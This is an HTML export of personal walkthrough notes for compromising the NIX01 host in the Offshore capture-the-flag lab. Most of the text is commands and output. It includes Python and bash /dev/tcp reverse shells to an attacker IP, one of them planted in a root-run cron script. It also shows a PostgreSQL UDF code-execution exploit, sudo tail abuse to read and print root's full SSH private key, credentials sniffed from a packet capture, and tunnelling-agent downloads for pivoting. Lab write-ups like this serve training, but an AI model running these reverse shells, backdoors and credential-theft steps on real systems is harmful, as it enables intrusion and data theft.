<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>NIX01 - 10.10.110.123</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>NIX01 - 10.10.110.123</h1><br/><p><a href="Offshore--NIX01_-_10.10.110.123_3.html#OFS-Flag1">Flag 1</a></p><p><a href="Offshore--NIX01_-_10.10.110.123_3.html#OFS-Flag2">Flag 2</a></p><p><a href="Offshore--NIX01_-_10.10.110.123_3.html#OFS-Flag3">Flag 3</a></p><p><a href="Offshore--NIX01_-_10.10.110.123_3.html#OFS-Flag4">Flag 4</a></p><p><a href="Offshore--NIX01_-_10.10.110.123_3.html#OFS-Creds1">Credentials for 172.16.1.30 / MS-01</a></p><p></p><p>Here is the nmap scan section for NIX01</p><p></p><p><code><span style="background-color:#000000;">Nmap scan report for 10.10.110.123</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Host is up (0.024s latency).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">PORT     STATE    SERVICE  VERSION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">22/tcp   open     ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">80/tcp   open     http     Apache httpd 2.4.18 ((Ubuntu))</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">443/tcp  filtered https</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">8000/tcp open     http     Splunkd httpd</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">8089/tcp open     ssl/http Splunkd httpd</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code></p><p>Webservers are always interesting, let&#39;s check them out</p><p></p><p>How convenient - if we go to <a href="http://10.10.110.123:8000">http://10.10.110.123:8000</a> it signs us right into Splunk</p><p></p><p>I wonder if this exploit would work to pop a shell</p><p><a href="https://www.n00py.io/2018/10/popping-shells-on-splunk/">https://www.n00py.io/2018/10/popping-shells-on-splunk/</a></p><p></p><p><span style="background-color:#000000;">Here we find our first flag</span><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">└─$ nc -nlvp 4444</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">listening on [any] 4444 ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">connect to [10.10.15.154] from (UNKNOWN) [10.10.110.123] 35492</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">whoami   </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mark</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ls /home/mark </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cat /home/mark/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag1"></a>OFFSHORE{b3h0ld_th3_P0w3r_0f_$plunk}</p><p></p><p>Get a normal shell with LazyShell</p><p><code><span style="background-color:#000000;">┌──(user㉿DESKTOP)-[~/Prolabs/Offshore/LazyShell]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">└─$ python lazyShell.py tun0 53 python</span></code></p><p></p><p>[*] Starting the listener on 10.10.15.154:53...</p><p>/bin/sh: 0: can&#39;t access tty; job control turned off</p><p><code><span style="background-color:#000000;">$ python -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mark@NIX01:/$ </span></code></p><p></p><p>Transfer over pspy using FTP</p><p>Install FTP in Kali <a href="https://linuxtiwary.com/2019/02/16/how-to-configure-ftp-server-on-kali-linux/">https://linuxtiwary.com/2019/02/16/how-to-configure-ftp-server-on-kali-linux/</a></p><p></p><p><code><span style="background-color:#000000;">mark@NIX01:/home/mark$ ftp -p 10.10.15.154</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp -p 10.10.15.154</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Connected to 10.10.15.154.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 (vsFTPd 3.0.3)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Name (10.10.15.154:mark): sammy</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">sammy</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">331 Please specify the password.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Password:********</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">230 Login successful.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Remote system type is UNIX.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Using binary mode to transfer files.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">227 Entering Passive Mode (10,10,15,154,200,77).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">150 Here comes the directory listing.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">drwxr-xr-x    2 1001     1001         4096 Apr 19 15:09 files</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">226 Directory send OK.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; cd files</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cd files</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">250 Directory successfully changed.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">227 Entering Passive Mode (10,10,15,154,60,232).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">150 Here comes the directory listing.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">-rw-r--r--    1 0        0         3104768 Apr 19 15:09 pspy64</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">226 Directory send OK.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; get pspy64</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">get pspy64</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">local: pspy64 remote: pspy64</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">227 Entering Passive Mode (10,10,15,154,66,49).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">150 Opening BINARY mode data connection for pspy64 (3104768 bytes).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">226 Transfer complete.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">3104768 bytes received in 1.15 secs (2.5676 MB/s)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; exit</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">exit</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 Goodbye.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mark@NIX01:/home/mark$ ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">flag.txt  pspy  pspy64</span></code></p><p></p><p></p><p>We see a script running, let&#39;s check it out</p><p></p><p><code><span style="background-color:#000000;">2023/04/19 12:15:01 CMD: UID=0     PID=40240  | /bin/sh -c /usr/local/sbin/splunk-check.sh </span></code></p><p></p><p><code><span style="background-color:#000000;">mark@NIX01:/$ cat /usr/local/sbin/splunk-check.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cat /usr/local/sbin/splunk-check.sh</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"># Ippsec&#39;s Splunk Monitoring Script</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">splunk_home=/opt/splunk</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">splunk_err=$(tail $splunk_home/var/log/splunk/splunkd.log | grep -a &#39;Read Timeout while connecting&#39;)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">restart_splunk=0</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">if [[ ! -z &quot;$splunk_err&quot; ]]; then</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    restart_splunk=1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    echo &quot;$(date +&quot;%y/%m/%d-%H:%M&quot;) - Believe Splunk is unresponsive, restarting&quot; &gt;&gt; /root/splunk.log</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    fi</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">for bad_app in $(find $splunk_home -name terminal.xml | awk -F\/ &#39;{print $(NF-5)}&#39;); do</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    if pgrep -x &quot;splunkd&quot; &gt; /dev/null; then</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">        $splunk_home/bin/splunk stop</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">        fi</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    $splunk_home/bin/splunk remove app $bad_app</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    echo &quot;$(date +&quot;%y/%m/%d-%H:%M&quot;) - Terminal.xml found, removing app $bad_app&quot; &gt;&gt; /root/splunk.log</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    restart_splunk=1</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    done</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">python -c &quot;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.15.154&quot;,53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&quot;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">if [ &quot;$restart_splunk&quot; -eq &quot;1&quot; ]; then</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    $splunk_home/bin/splunk restart</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">    fi</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code></p><p>From this output we can tell postgres is running</p><p></p><p>Use this exploit</p><p><a href="https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed">https://blog.pentesteracademy.com/postgresql-udf-command-execution-372f0c68cfed</a></p><p></p><p>From that link, transfer pgexec.s and pg_exec.c - I did it via FTP.</p><p></p><p>Compile pg_exec.so and set the path parameter</p><p><code><span style="background-color:#000000;">mark@NIX01:~$ gcc -I$(/usr/local/pgsql/bin/pg_config --includedir-server) -shared -fPIC -o pg_exec.so pg_exec.c</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mark@NIX01:~$ PATH=&quot;/usr/local/pgsql/bin:$PATH&quot;</span></code></p><p></p><p>Run the reverse shell and catch it in another session</p><p></p><p><code><span style="background-color:#000000;">mark@NIX01:/tmp$ ftp -p 10.10.15.154</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Connected to 10.10.15.154.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">220 (vsFTPd 3.0.3)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Name (10.10.15.154:root): sammy</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">331 Please specify the password.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Password:</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">230 Login successful.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Remote system type is UNIX.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Using binary mode to transfer files.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; ls</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">227 Entering Passive Mode (10,10,15,154,44,7).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">150 Here comes the directory listing.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">drwxr-xr-x    2 1001     1001         4096 Apr 19 20:23 files</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">226 Directory send OK.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; cd files</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">250 Directory successfully changed.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; get mysqlfile.sql</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">local: mysqlfile.sql remote: mysqlfile.sql</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">227 Entering Passive Mode (10,10,15,154,231,192).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">150 Opening BINARY mode data connection for mysqlfile.sql (119 bytes).</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">226 Transfer complete.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">119 bytes received in 0.00 secs (2.2252 MB/s)</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">ftp&gt; exit</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">221 Goodbye.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mark@NIX01:/tmp$ cd ~</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">mark@NIX01:~$ ./pg_exec.sh -c &#39;/bin/bash -c &quot;0&lt;&amp;97-;exec 97&lt;&gt;/dev/tcp/10.10.15.154/4447;sh &lt;&amp;97 &gt;&amp;97 2&gt;&amp;97&quot;&#39;</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Using existing library pg_exec.so</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">CREATE FUNCTION</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Executing /bin/bash -c &quot;0&lt;&amp;97-;exec 97&lt;&gt;/dev/tcp/10.10.15.154/4447;sh &lt;&amp;97 &gt;&amp;97 2&gt;&amp;97&quot;</span></code></p><p></p><p>Catch</p><p></p><p><code><span style="background-color:#000000;">└─$ nc -nlvp 4447</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">listening on [any] 4447 ...</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">connect to [10.10.15.154] from (UNKNOWN) [10.10.110.123] 46350</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;">Search for flags:</span><span style="background-color:#000000;"></span></p><p><span style="background-color:#000000;"></span><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">find / -name &quot;flag.txt&quot; 2&gt;/dev/null</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/home/mark/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">/var/lib/postgresql/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">cat /var/lib/postgresql/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag2"></a>OFFSHORE{fun_w1th_m@g1k_bl0ck$}</p><p></p><p>Privilege escalation - we can run tail as sudo with no password from the postgres account<code></code></p><p><code></code><code></code></p><p><code>sudo -l</code><code></code></p><p><code>Matching Defaults entries for postgres on NIX01:</code><code></code></p><p><code>    env_reset, mail_badpass,</code><code></code></p><p><code>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin</code><code></code></p><p><code></code><code></code></p><p><code>User postgres may run the following commands on NIX01:</code><code></code></p><p><code>    (ALL) NOPASSWD: /usr/bin/tail</code><code></code></p><p><code>sudo /usr/bin/tail -n 100 /root/.ssh/id_rsa</code><code></code></p><p><code>-----BEGIN RSA PRIVATE KEY-----</code><code></code></p><p><code>MIIEowIBAAKCAQEAoqnXGZVkxIu7Y9+Bln8k1irzetIT+WkRLHeHvj1Hv0FV/JOO</code><code></code></p><p><code>cqAatFMmCe7NERWu+x2yrT/JT9kdb/Z0YS5WLEbWdxJihhgj1YTwRLjRw818Uxyr</code><code></code></p><p><code>HBGufOU4rHmitZAMVWiPIgZS/+7dxt4PEhxVdj2MJMTzzvo4MU1NBWfQt8p/i6kw</code><code></code></p><p><code>HKH93iCrUHvUsDqHbJnK9Z03QL5ZaGN7hPntHUDLLpOvBO9e2sjUJAUuu2HUeNGf</code><code></code></p><p><code>OtYEBEe3J21FSUTucoXiEzSEg5eyK/X6JywELbPB4wfB+vDNN1D8GIQdemX1HjrI</code><code></code></p><p><code>Wm3F/WnZ3wXzYQRAg44SsZHherfVKPM8J/jv6QIDAQABAoIBAFyAgy8sUtqmr9Dy</code><code></code></p><p><code>6InCEhus3ztoPi2mfzqvWsVnqeZsbE6vRuGOhMEpS8d4QqvFjfWGBPcbAAtlZ6Ul</code><code></code></p><p><code>HTeqlxykyA98qASjs7UX3V7nT3qu31WQRwo2T+j8nYcPwOTJXwou5L6vpAGhQAN4</code><code></code></p><p><code>gk+FR2BvTcQXMKLyjoQS9ortZ7csC9ZSJtZpU8inH0eIHmhG9aou2grGfKLbHDyT</code><code></code></p><p><code>Td7x3FLCX15K2XQKaKMnOt1upWcn5KoXpRY3xrvSEaNOeON1f3gmdDi9CDxfVrJH</code><code></code></p><p><code>LE68QixJsdrmXBQJBMoNXje9m6Y6r0AzqHLXPQtscEqNIsePYxt6mnUfthTYX8Fb</code><code></code></p><p><code>v1VxU9UCgYEAzF6M4TL+nnTiKhb+LFEx8e3B3Rb4h9SZADq5ha44p8KtJFanV0oG</code><code></code></p><p><code>eAO67BA1oCA976R0FeZpiiIvZlxAmhw2K8tSJ53QJL9xnfr2OMJytQr/9ov1mF4U</code><code></code></p><p><code>MAqQSE2vMisfQEb6moWUQKEa8aZ+VYBnE2Lp9oAAQWsVINzVMKxdHBsCgYEAy8H9</code><code></code></p><p><code>KcgtoVNzFJZQxPNIwR6QdngCn2GKu93+Z4vX/d00zA/XkpkYQHZvqKwSafmgu2AX</code><code></code></p><p><code>j5hhJkUVz+iNZzU6pZKBoHxSNnJOynSeQMzHNKikNud9YW8pas+buYi2TSxTFL1L</code><code></code></p><p><code>H6vKATQn3aSFWsM/eNFVdDGp8mcPkQ3vl5FIXEsCgYASbS/8mhF1DgraSqpuKn/7</code><code></code></p><p><code>VTmWipyr+pI1ABZ8JCI9lgLwdNOvvh/pMETpRejf4ChVdBl3ZAf+CWkGrKiyfHqx</code><code></code></p><p><code>5iopIkSDG7PNz7PlmDqpci1z+FiTfWAKmNk7e62hM1wk+oFb71FXpm78fMuFQAeL</code><code></code></p><p><code>Ku73Z8EeJN6J0P9z3QakIwKBgQCQZMGumVBU0hlsjnVgjPOS/8DqY3OgVPSG2/PM</code><code></code></p><p><code>l1qSae9faR6goeOA0y2fv4kxFpjkEF3CAf9eqnihpLCIYj1UVnWMMG3mba0OZgQ7</code><code></code></p><p><code>8aJ928C7s+KzaJ5WNheqLIrcN7wMp3SUVh5KKhbSSCPExTa2vMotFIDV6lkqt1CB</code><code></code></p><p><code>/Y/k7wKBgESEY+taPfoUO49mMsmiBn96XlTx9pCg6WlXPZeCTCymUXDovNn1HfxK</code><code></code></p><p><code>CS5Lckpjr11RNP+xb8G1Q8xSiJNfMtrBsVh2es7QxVnrQsd4B+2UQC5llehHD/Uk</code><code></code></p><p><code>pnJob1HS8o17jQFgleQYYFvDDtGqj87ZgfcLBmc+JbP+oYiXbfKE</code><code></code></p><p><code>-----END RSA PRIVATE KEY-----</code></p><p></p><p></p><p>Save the key and login as root</p><p><code><span style="background-color:#000000;">└─$ ssh -i ~/Prolabs/id_rsa root@10.10.110.123   </span></code></p><p></p><p><code><span style="background-color:#000000;">root@NIX01:~# cat /root/flag.txt</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;"></span></code><a name="OFS-Flag3"></a>OFFSHORE{st0p_tai1ing_m3_br0}</p><p></p><p>Lastly, do a packet capture to examine traffic:</p><p></p><p><code><span style="background-color:#000000;">tcpdump -i eth0 -w dump.pca</span></code></p><p></p><p>Open this in Wireshark to examine</p><p></p><p><img src="images/3-1.png" alt="images/3-1.png" /></p><p></p><p>Here we get credentials for <a name="OFS-Creds1"></a><code><span style="background-color:#000000;">172.16.1.30:  admin / Zaq12wsx!</span></code></p><p>And flag 4</p><p><a name="OFS-Flag4"></a><code><span style="background-color:#000000;">OFFSHORE{l0v3_cl3artext_pr0tocol$}</span></code></p><p></p><p></p><p>Setup tunnel through 10.10.16.94 to 172.16.1.0/24</p><p></p><p>Using ligolo-ng from <a href="https://github.com/nicocha30/ligolo-ng">https://github.com/nicocha30/ligolo-ng</a></p><p></p><p>Serve the agent on a python http server and wget on NIX01</p><p><code><span style="background-color:#000000;">root@NIX01:~# cd /tmp</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">root@NIX01:/tmp# wget 10.10.16.94/agent</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">--2023-05-01 11:02:56--  http://10.10.16.94/agent</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Connecting to 10.10.16.94:80... connected.</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">HTTP request sent, awaiting response... 200 OK</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Length: 4501504 (4.3M) [application/octet-stream]</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">Saving to: ‘agent’</span></code><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><code><span style="background-color:#000000;">agent                        100%[==============================================&gt;]   4.29M  2.51MB/s    in 1.7s  </span></code><strong><code><span style="background-color:#000000;">  </span></code></strong><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><code><span style="background-color:#000000;">2023-05-01 11:02:58 (2.51 MB/s) - ‘agent’ saved [4501504/4501504]</span></code><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><strong><code><span style="background-color:#000000;"></span></code></strong></p><p><strong><code><span style="background-color:#000000;"></span></code></strong><code><span style="background-color:#000000;">root@NIX01:/tmp# chmod +x agent</span></code></p><p></p><p>Get ready to start the proxy on attack host</p><p><code><span style="background-color:#000000;">sudo ip tuntap add user user mode tun ligolo  &lt;--- the second “user” is your kali username!!</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">sudo ip link set ligolo up</span></code></p><p></p><p><code><span style="background-color:#000000;">sudo ip route add 172.16.1.0/24 dev ligolo</span></code></p><p></p><p><code><span style="background-color:#000000;">./proxy -selfcert -laddr 10.10.16.94:11600</span></code></p><p></p><p>Connect back to the proxy from the agent</p><p><code><span style="background-color:#000000;">root@NIX01:/tmp# ./agent -connect 10.10.16.94:11600 -ignore-cert</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">WARN[0000] warning, certificate validation disabled     </span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">INFO[0000] Connection established                        addr=&quot;10.10.16.94:11600&quot;</span></code></p><p></p><p>You see it join the proxy</p><p><code><span style="background-color:#000000;">ligolo-ng » INFO[0044] Agent joined.                                 name=root@NIX01 remote=&quot;10.10.110.123:42720&quot;</span></code></p><p></p><p>Select the session with “session”, hit enter on the right session (when you get more than 1), and type start and hit enter</p><p><code><span style="background-color:#000000;">ligolo-ng » session</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">? Specify a session : 1 - root@NIX01 - 10.10.110.123:42720</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[Agent : root@NIX01] » start</span></code><code><span style="background-color:#000000;"></span></code></p><p><code><span style="background-color:#000000;">[Agent : root@NIX01] » INFO[0117] Starting tunnel to root@NIX01</span></code></p></div>
</body>
</html>
